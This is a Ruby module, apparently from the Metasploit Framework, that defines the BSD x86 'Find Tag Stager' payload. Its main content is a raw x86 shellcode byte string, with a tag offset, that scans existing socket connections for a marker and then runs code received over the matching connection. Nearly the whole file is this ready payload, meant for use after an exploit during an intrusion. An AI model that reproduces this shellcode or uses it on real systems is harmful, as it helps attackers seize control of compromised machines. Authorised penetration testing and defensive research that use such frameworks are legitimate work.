##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/handler/find_tag'


###
#
# FindTag
# -------
#
# BSD find tag stager.
#
###
module Metasploit3

  include Msf::Payload::Stager

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Find Tag Stager',
      'Description'   => 'Use an established connection',
      'Author'        => 'skape',
      'License'       => MSF_LICENSE,
      'Platform'      => 'bsd',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::FindTag,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'TAG' => [ 0x1b, 'RAW' ],
            },
          'Payload' =>
            "\x31\xd2\x52\x89\xe6\x52\x52\xb2\x80\x52\xb6\x0c\x52\x56\x52\x52" +
            "\x66\xff\x46\xe8\x6a\x1d\x58\xcd\x80\x81\x3e\x6d\x73\x66\x21\x75" +
            "\xef\xfc\xad\x5a\x5f\x5a\xff\xe6"
        }
      ))
  end

end
